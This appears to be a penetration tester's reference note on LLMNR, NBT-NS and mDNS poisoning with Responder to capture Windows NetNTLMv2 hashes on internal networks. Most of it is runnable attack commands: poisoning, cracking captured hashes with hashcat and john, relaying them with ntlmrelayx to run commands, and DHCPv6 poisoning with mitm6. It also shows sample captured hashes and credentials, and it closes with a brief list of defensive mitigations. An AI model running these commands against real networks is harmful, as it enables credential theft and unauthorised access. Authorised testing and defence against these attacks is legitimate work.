---
tags: [pentest, responder, llmnr, nbt-ns, mdns, mitm, ad, active-directory, initial-access, windows]
tool: responder
phase: 5
---
# Responder - LLMNR / NBT-NS / mDNS Poisoning

LAN-level credential capture by answering broadcast name lookups that should fail. **The #1 way to get NetNTLMv2 hashes on internal networks.**

[[06 - Gaining Access/00 - README|Folder index]]

## How it works

Windows boxes that can't resolve a name via DNS fall back to broadcast protocols:

1. **LLMNR** (UDP 5355) - multicast
2. **NBT-NS** (UDP 137) - broadcast
3. **mDNS** (UDP 5353) - multicast

Responder listens for these broadcasts and answers "yes, I'm that machine," receiving the victim's authentication attempt - which contains a NetNTLMv2 hash you can crack.

## Run

```bash
# Edit Responder.conf BEFORE running - critical!
sudo nano /etc/responder/Responder.conf
# Make sure:
# SMB = On
# HTTP = On
# (When relaying, you'd turn SMB / HTTP OFF - see [[12 - ntlmrelayx]])

# Basic
sudo responder -I eth0 -wd
# -I interface
# -w  WPAD proxy server
# -d  poison DHCP responses (helps in DHCPv6 attacks)
# -A  analyze mode - listen but don't poison (great for scoping)
```

## What you'll capture

```text
[SMB] NTLMv2-SSP Hash     : alice::CORP:1122334455667788:abcdef...:0101000000000000...
[HTTP] NTLMv2-SSP Hash    : bob::CORP:...
[FTP] Cleartext           : svc_print:Hunter2!
[MSSQL] NTLMv2-SSP Hash   : ...
```

Captures go to `/usr/share/responder/logs/`.

## Crack captured NetNTLMv2

```bash
# Save the line that says "NTLMv2-SSP Hash : ..."  (the part AFTER "Hash :")
echo 'alice::CORP:1122334455667788:abcdef...' > ntlmv2.txt

# Hashcat mode 5600
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=netntlmv2 --wordlist=rockyou.txt ntlmv2.txt
```

## Analyze mode (recon-only)

```bash
sudo responder -I eth0 -A
# Listens passively - prints what's being requested without poisoning.
# Use during scoping to assess noise / which hosts make broadcasts.
```

## Other Responder modules

```bash
# Inveigh (Windows equivalent)
.\Inveigh.exe -Tool 1 -SpooferRepeat N

# Custom HTTP basic auth grab
sudo responder -I eth0 -wd -F          # Force HTTP basic auth instead of NTLM
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| No hashes after 10 minutes on a real corp net | LLMNR/NBT-NS may be disabled (mature env). Try mitm6 (IPv6 RA) for DHCPv6 poisoning. |
| Only your own machine's hashes appearing | You're poisoning yourself. Check `-I`. |
| `Error binding port 53 / 88` | Conflict with running services. `sudo systemctl stop systemd-resolved` or pick another interface. |
| Hashes appear but won't crack | Strong password. Try `OneRuleToRuleThemAll.rule`. Pivot to relay (see [[12 - ntlmrelayx]]). |

## Relay instead of crack

If the captured hash won't crack, RELAY it. See [[12 - ntlmrelayx]].

**Before** starting Responder in relay mode, you MUST disable SMB and HTTP in Responder.conf, otherwise Responder answers (and captures) instead of letting ntlmrelayx receive the auth.

```bash
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I eth0 -wdv      # still poisons names, just doesn't capture
# In another terminal:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell ..."
```

## mitm6 (IPv6 alternative when LLMNR/NBT-NS are disabled)

```bash
sudo mitm6 -i eth0 -d corp.local
# Pair with ntlmrelayx for relay attacks via DHCPv6 takeover
```

## Defender's view

```text
- Disable LLMNR via GPO: Computer Configuration > Administrative Templates > Network > DNS Client > Turn off Multicast Name Resolution
- Disable NetBIOS over TCP/IP per network adapter (or via DHCP option 1)
- Require SMB signing on all hosts (kills SMB relay)
- Enable Extended Protection for Authentication (EPA) on web apps
```

> [!tip] Quick discovery: is this network exploitable?
> Run `responder -I eth0 -A` (analyze) for 10 min. If you see queries for non-existent hosts (`<random-string>`, `WPAD`, `<misspelled-server>`), you're in business.
